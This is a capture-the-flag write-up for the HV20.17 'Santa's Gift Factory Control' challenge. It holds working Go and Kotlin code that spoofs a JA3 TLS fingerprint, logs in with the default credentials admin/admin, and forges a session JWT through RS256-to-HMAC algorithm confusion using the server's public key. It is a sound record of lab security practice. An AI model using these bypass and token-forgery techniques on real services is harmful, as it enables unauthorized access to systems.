# HV20.17 Santa's Gift Factory Control

_Santa has a customized remote control panel for his gift factory at the north pole. Only clients with the following
fingerprint seem to be able to connect:_

`771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0`

## Mission

_Connect to Santa's super-secret control panel and circumvent its access controls._

[Santa's Control Panel](https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/)

## Hints

- _The remote control panel does client fingerprinting_

---

This is about [TLS fingerprinting](https://blog.squarelemon.com/tls-fingerprinting/).

The server responds with `HTTP 403 Forbidden`. We will have to bypass it somehow.

Read [Impersonating JA3 Fingerprint](https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42). It comes
with this nice [JA3Transport](https://github.com/CUCyber/ja3transport) library which is written
in [Go](https://golang.org/).

I wasn't familiar with Go at all...

This is how I bypassed the TLS fingerprinting filter:

```go
package main

import "fmt"
import "io/ioutil"
import "net/http"
import "github.com/CUCyber/ja3transport"

func main() {
    client, _ := ja3transport.NewWithString("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
    
    // Get homepage
    req, _ := http.NewRequest("GET", "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/", nil)
    resp, _ := client.Do(req)
    
    // Print response headers
    for k, v := range resp.Header {
        fmt.Print(k)
        fmt.Print(" : ")
        fmt.Println(v)
    }
    
    // Print response body
    defer resp.Body.Close()
    bodyBytes, _ := ioutil.ReadAll(resp.Body)
    bodyString := string(bodyBytes)
    fmt.Print(bodyString)
}
```

Response from the server:

```
Server : [nginx/1.19.6]
Date : [Thu, 17 Dec 2020 20:19:17 GMT]
Content-Type : [text/html; charset=utf-8]
Content-Length : [1103]
Connection : [keep-alive]
```
```html
<html>
    <head>
        <meta charset="utf-8">
        <title>Santa's Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="static/bootstrap/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="static/fontawesome/css/all.min.css" rel="stylesheet" media="screen">
        <link href="static/style.css" rel="stylesheet" media="screen">
    </head>
    <body>
        <div class="login">
            <h1>Login</h1>
            <form action="/login" method="post">
                <label for="username">
                    <i class="fas fa-user"></i>
                </label>
                <input type="text" name="username" placeholder="Username" id="username">
                <label for="password">
                    <i class="fas fa-lock"></i>
                </label>
                <input type="password" name="password" placeholder="Password" id="password">
                
                <input type="submit" value="Login">
            </form>
        </div>
        
    </body>
</html>
```

A simple login form... I tried a few things such as SQL injection or guessing the password. I got lucky when
sending `admin/admin`:

```go
// Send login
req, _ := http.NewRequest("POST", "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/login", strings.NewReader("username=admin&password=admin"))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
resp, _ := client.Do(req)
```

Response from the server:

```
Content-Type : [text/html; charset=utf-8]
Content-Length : [1275]
Connection : [keep-alive]
Set-Cookie : [session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyNDA1ODYsImlhdCI6MTYwODIzNjk4Niwic3ViIjoibm9uZSJ9.c19Xrlilv1H3k47UJlObQSn4ihlIgahge4u8141AcgFEmqAqXYNM68SUTa9gw0-IGI02t1hxSSBp1Ro_6O3LV0RUz0AHW5p7ZpqQpunJooZLXePddakn0flyi9XafP4JM_pVn9eTOAmn32Pj0_IaAQ6z_fGJcAxuQ2e8QLmW3abW0VNsTO_Df8zdpUZ8xyYbTQ_f44KSu42u5wqPgspNXQmMAX7cMoHC4UJzjPffAKE46rCaX7pS1zHPH5k0SwSBKdJ9VEMl4KYpkmqyOmGPScF6Qaj--Qgjpc87kecDimEAAHn85_VWbhbI4r19LyovTen1hcNB1nKD2ZsoyXEofg; Path=/]
Server : [nginx/1.19.6]
Date : [Thu, 17 Dec 2020 20:29:46 GMT]
```
```html
<html>
    ...
    <!--DevNotice: User santa seems broken. Temporarily use santa1337.-->
</html>
```

Cool, we know Santa's login now!

There is one more important thing - **a session with JWT token**!

I decoded the token at https://jwt.io/:

```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "/keys/1d21a9f945"
}
{
  "exp": 1608240586,
  "iat": 1608236986,
  "sub": "none"
}
```

It's signed with an RSA public key located under `/keys/1d21a9f945`.

Let's get the key:

```go
// Get key
req, _ := http.NewRequest("GET", "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/keys/1d21a9f945", nil)
resp, _ := client.Do(req)
```

Response from the server:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY
Ri7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb
SYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs+2tmcgui/bFn
wC+qByZtIlsP+rlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3
US8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq+tH95/9u
X/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw
zwIDAQAB
-----END PUBLIC KEY-----

```

I tried to crack the key with [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) but it looks solid.

I knew about some attacks against JWT tokens. The Simplest one is just changing the verification from `RS256` to `none`
and strip the signature. It didn't work though.

Then I came across this
article [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
. There is a very nice attack against RSA verified tokens. Read the details in the article and pay big attention to:
> The trickiest part is making sure that `serverRSAPublicKey` is identical to the verification key used on the server. The strings must match exactly for the attack to work -- exact same format, and no extra or missing line breaks.

I crafted my forged token with a Java lib:

```kotlin
import cz.vernjan.ctf.Resources
import io.jsonwebtoken.Jwts
import io.jsonwebtoken.security.Keys
import java.util.*

fun main() {
    val key = Keys.hmacShaKeyFor(Resources.asBytes("hv20/key.pub"))

    val jws = Jwts.builder()
        .setSubject("santa1337")
        .setIssuedAt(Date())
        .setExpiration(Date(System.currentTimeMillis() + 1000 * 3600 * 24))
        .setHeaderParam("kid", "1d21a9f945")
        .signWith(key).compact()

    println(jws)
}

// Prints eyJraWQiOiIxZDIxYTlmOTQ1IiwiYWxnIjoiSFM1MTIifQ.eyJzdWIiOiJzYW50YTEzMzciLCJpYXQiOjE2MDgyMzc5MDQsImV4cCI6MTYwODMyNDMwNH0.W5o5nvnVzubP_pChXtPPSD0HTgEv1JSemLHRLfiYl7RPt3Zg8n48REDRWb9oLZXku3hWyDZX0nHQK4OBhy7Wbg
```

Grab the token and use it to bypass the login (full source at [client.go](client.go)):

```go
// Get homepage
req, _ := http.NewRequest("GET", "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/", nil)
req.Header.Set("Cookie", "session=eyJraWQiOiIxZDIxYTlmOTQ1IiwiYWxnIjoiSFM1MTIifQ.eyJzdWIiOiJzYW50YTEzMzciLCJpYXQiOjE2MDgyMjgzNDQsImV4cCI6MTYwODMxNDc0NH0.ly4-lXnExyYE4bm2n42shPxK-XXHNaVLVcTMkeo13Q1DUYhalUViA3ereutshmHTNtL3tdrnZAxlGQSkkAM1FQ")
resp, _ := client.Do(req)
```

Response from the server:

```
...
<!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
...
```

The flag is `HV20{ja3_h45h_1mp3r50n4710n_15_fun}`

---

💡 Fun fact, Python lib [PyJWT](https://pyjwt.readthedocs.io/en/stable/) is too smart for this job and won't let you use
RSA public key for signing with HMAC:

```python
import jwt

f = open("key.pub", "r")
key = f.read()

payload = {
    "exp": 1609229515,
    "iat": 1608225915,
    "sub": "santa1337"
}

encoded_jwt = jwt.encode(payload, key, algorithm='HS256', headers={'kid': '1d21a9f945'})
print(encoded_jwt)
```

Exits with error:

```
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```
